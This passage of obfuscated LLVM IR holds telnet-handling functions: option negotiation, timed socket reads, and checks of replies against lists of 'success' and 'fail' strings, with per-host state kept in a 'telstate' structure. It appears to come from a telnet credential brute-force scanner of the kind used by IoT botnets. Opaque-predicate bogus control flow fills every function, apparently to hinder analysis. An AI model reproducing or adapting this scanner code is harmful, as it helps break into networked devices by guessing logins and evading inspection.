  store i32 0, i32* %107, align 4
  store i32 0, i32* %106, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %24
  %108 = load i8**, i8*** %13, align 8
  %109 = load i32, i32* %14, align 4
  %_ = sub i32 0, %109
  %gen = add i32 %_, 1
  %_2 = sub i32 0, %109
  %gen3 = add i32 %_2, 1
  %_4 = sub i32 %109, 1
  %gen5 = mul i32 %_4, 1
  %_6 = shl i32 %109, 1
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %14, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i8*, i8** %108, i64 %111
  %113 = load i8*, i8** %112, align 8
  %114 = icmp ne i8* %113, null
  br label %originalBB1

originalBB10alteredBB:                            ; preds = %originalBB10, %50
  %115 = load i32, i32* %15, align 4
  %116 = load i32, i32* %14, align 4
  %117 = icmp slt i32 %115, %116
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %70
  %118 = load i8*, i8** %12, align 8
  %119 = load i8**, i8*** %13, align 8
  %120 = load i32, i32* %15, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %118, i8* %123)
  %125 = icmp ne i32 %124, 0
  br label %originalBB14
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = load i32, i32* @x.7
  %3 = load i32, i32* @y.8
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 @contains_string(i8* %11, i8** getelementptr inbounds ([18 x i8*], [18 x i8*]* @successes, i32 0, i32 0))
  %13 = load i32, i32* @x.7
  %14 = load i32, i32* @y.8
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %12

originalBBalteredBB:                              ; preds = %originalBB, %1
  %21 = alloca i8*, align 8
  store i8* %0, i8** %21, align 8
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @contains_string(i8* %22, i8** getelementptr inbounds ([18 x i8*], [18 x i8*]* @successes, i32 0, i32 0))
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = load i32, i32* @x.9
  %3 = load i32, i32* @y.10
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 @contains_string(i8* %11, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @fails, i32 0, i32 0))
  %13 = load i32, i32* @x.9
  %14 = load i32, i32* @y.10
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %12

originalBBalteredBB:                              ; preds = %originalBB, %1
  %21 = alloca i8*, align 8
  store i8* %0, i8** %21, align 8
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @contains_string(i8* %22, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @fails, i32 0, i32 0))
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !1
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %51

; <label>:44:                                     ; preds = %27
  %45 = load i32, i32* %6, align 4
  %46 = load i8*, i8** %8, align 8
  %47 = load i32, i32* %9, align 4
  %48 = sext i32 %47 to i64
  %49 = call i64 @recv(i32 %45, i8* %46, i64 %48, i32 0)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %5, align 4
  br label %51

; <label>:51:                                     ; preds = %44, %43
  %52 = load i32, i32* %5, align 4
  ret i32 %52
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %54

; <label>:37:                                     ; preds = %31
  %38 = load i32, i32* @x.15
  %39 = load i32, i32* @y.16
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  store i32 0, i32* %6, align 4
  %46 = load i32, i32* @x.15
  %47 = load i32, i32* @y.16
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %54

; <label>:54:                                     ; preds = %originalBBpart2, %36
  %55 = load i32, i32* %6, align 4
  ret i32 %55

originalBBalteredBB:                              ; preds = %originalBB, %37
  store i32 0, i32* %6, align 4
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %125 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %143

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %39

; <label>:22:                                     ; preds = %14
  %23 = load i32, i32* @x.17
  %24 = load i32, i32* @y.18
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  store i8 -2, i8* %8, align 1
  %31 = load i32, i32* @x.17
  %32 = load i32, i32* @y.18
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %118

; <label>:39:                                     ; preds = %14
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 254, %43
  br i1 %44, label %45, label %62

; <label>:45:                                     ; preds = %39
  %46 = load i32, i32* @x.17
  %47 = load i32, i32* @y.18
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  store i8 -4, i8* %8, align 1
  %54 = load i32, i32* @x.17
  %55 = load i32, i32* @y.18
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %117

; <label>:62:                                     ; preds = %39
  %63 = load i8*, i8** %6, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 3, %66
  br i1 %67, label %68, label %92

; <label>:68:                                     ; preds = %62
  %69 = load i32, i32* @x.17
  %70 = load i32, i32* @y.18
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  %77 = load i8*, i8** %6, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 253
  %82 = select i1 %81, i32 251, i32 253
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %8, align 1
  %84 = load i32, i32* @x.17
  %85 = load i32, i32* @y.18
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %116

; <label>:92:                                     ; preds = %62
  %93 = load i32, i32* @x.17
  %94 = load i32, i32* @y.18
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %92
  %101 = load i8*, i8** %6, align 8
  %102 = getelementptr inbounds i8, i8* %101, i64 1
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 253
  %106 = select i1 %105, i32 252, i32 254
  %107 = trunc i32 %106 to i8
  store i8 %107, i8* %8, align 1
  %108 = load i32, i32* @x.17
  %109 = load i32, i32* @y.18
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %116

; <label>:116:                                    ; preds = %originalBBpart212, %originalBBpart28
  br label %117

; <label>:117:                                    ; preds = %116, %originalBBpart24
  br label %118

; <label>:118:                                    ; preds = %117, %originalBBpart2
  %119 = load i32, i32* %5, align 4
  %120 = call i64 @send(i32 %119, i8* %8, i64 1, i32 16384)
  %121 = load i32, i32* %5, align 4
  %122 = load i8*, i8** %6, align 8
  %123 = getelementptr inbounds i8, i8* %122, i64 2
  %124 = call i64 @send(i32 %121, i8* %123, i64 1, i32 16384)
  br label %142

; <label>:125:                                    ; preds = %3
  %126 = load i32, i32* @x.17
  %127 = load i32, i32* @y.18
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %125
  %134 = load i32, i32* @x.17
  %135 = load i32, i32* @y.18
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %142

; <label>:142:                                    ; preds = %originalBBpart216, %118
  store i32 0, i32* %4, align 4
  br label %143

; <label>:143:                                    ; preds = %142, %13
  %144 = load i32, i32* %4, align 4
  ret i32 %144

originalBBalteredBB:                              ; preds = %originalBB, %22
  store i8 -2, i8* %8, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  store i8 -4, i8* %8, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  %145 = load i8*, i8** %6, align 8
  %146 = getelementptr inbounds i8, i8* %145, i64 1
  %147 = load i8, i8* %146, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 253
  %150 = select i1 %149, i32 251, i32 253
  %151 = trunc i32 %150 to i8
  store i8 %151, i8* %8, align 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %92
  %152 = load i8*, i8** %6, align 8
  %153 = getelementptr inbounds i8, i8* %152, i64 1
  %154 = load i8, i8* %153, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 253
  %157 = select i1 %156, i32 252, i32 254
  %158 = trunc i32 %157 to i8
  store i8 %158, i8* %8, align 1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %125
  br label %originalBB14
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %28

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* @x.21
  %9 = load i32, i32* @y.22
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %17 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %16, i32 0, i32 0
  %18 = load i32, i32* %17, align 8
  %19 = call i32 @close(i32 %18)
  %20 = load i32, i32* @x.21
  %21 = load i32, i32* @y.22
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %28

; <label>:28:                                     ; preds = %originalBBpart2, %2
  %29 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %30 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %29, i32 0, i32 7
  store i32 0, i32* %30, align 8
  %31 = load i32, i32* %4, align 4
  %32 = trunc i32 %31 to i8
  %33 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %34 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i32 0, i32 2
  store i8 %32, i8* %34, align 8
  %35 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %36 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i32 0, i32 9
  %37 = load i8*, i8** %36, align 8
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 1024, i32 1, i1 false)
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %38 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 8
  %41 = call i32 @close(i32 %40)
  br label %originalBB
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %35, %1
  %11 = load i32, i32* @x.25
  %12 = load i32, i32* @y.26
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i8*, i8** %2, align 8
  %20 = load i32, i32* %4, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = sext i8 %23 to i32
  %25 = call i32 @isspace(i32 %24) #9
  %26 = icmp ne i32 %25, 0
  %27 = load i32, i32* @x.25
  %28 = load i32, i32* @y.26
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %38

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %4, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %4, align 4
  br label %10

; <label>:38:                                     ; preds = %originalBBpart2
  br label %39

; <label>:39:                                     ; preds = %54, %38
  %40 = load i32, i32* %5, align 4
  %41 = load i32, i32* %4, align 4
  %42 = icmp sge i32 %40, %41
  br i1 %42, label %43, label %52

; <label>:43:                                     ; preds = %39
  %44 = load i8*, i8** %2, align 8
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = call i32 @isspace(i32 %49) #9
  %51 = icmp ne i32 %50, 0
  br label %52

; <label>:52:                                     ; preds = %43, %39
  %53 = phi i1 [ false, %39 ], [ %51, %43 ]
  br i1 %53, label %54, label %57

; <label>:54:                                     ; preds = %52
  %55 = load i32, i32* %5, align 4
  %56 = add nsw i32 %55, -1
  store i32 %56, i32* %5, align 4
  br label %39

; <label>:57:                                     ; preds = %52
  %58 = load i32, i32* %4, align 4
  store i32 %58, i32* %3, align 4
  br label %59

; <label>:59:                                     ; preds = %originalBBpart223, %57
  %60 = load i32, i32* %3, align 4
  %61 = load i32, i32* %5, align 4
  %62 = icmp sle i32 %60, %61
  br i1 %62, label %63, label %110

; <label>:63:                                     ; preds = %59
  %64 = load i32, i32* @x.25
  %65 = load i32, i32* @y.26
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %63
  %72 = load i8*, i8** %2, align 8
  %73 = load i32, i32* %3, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8, i8* %72, i64 %74
  %76 = load i8, i8* %75, align 1
  %77 = load i8*, i8** %2, align 8
  %78 = load i32, i32* %3, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub nsw i32 %78, %79
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8, i8* %77, i64 %81
  store i8 %76, i8* %82, align 1
  %83 = load i32, i32* @x.25
  %84 = load i32, i32* @y.26
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart29, label %originalBB1alteredBB

originalBBpart29:                                 ; preds = %originalBB1
  br label %91

; <label>:91:                                     ; preds = %originalBBpart29
  %92 = load i32, i32* @x.25
  %93 = load i32, i32* @y.26
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %91
  %100 = load i32, i32* %3, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %3, align 4
  %102 = load i32, i32* @x.25
  %103 = load i32, i32* @y.26
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart223, label %originalBB11alteredBB

originalBBpart223:                                ; preds = %originalBB11
  br label %59

; <label>:110:                                    ; preds = %59
  %111 = load i32, i32* @x.25
  %112 = load i32, i32* @y.26
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %110
  %119 = load i8*, i8** %2, align 8
  %120 = load i32, i32* %3, align 4
  %121 = load i32, i32* %4, align 4
  %122 = sub nsw i32 %120, %121
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds i8, i8* %119, i64 %123
  store i8 0, i8* %124, align 1
  %125 = load i32, i32* @x.25
  %126 = load i32, i32* @y.26
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart241, label %originalBB25alteredBB

originalBBpart241:                                ; preds = %originalBB25
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %133 = load i8*, i8** %2, align 8
  %134 = load i32, i32* %4, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8, i8* %133, i64 %135
  %137 = load i8, i8* %136, align 1
  %138 = sext i8 %137 to i32
  %139 = call i32 @isspace(i32 %138) #9
  %140 = icmp ne i32 %139, 0
  br label %originalBB

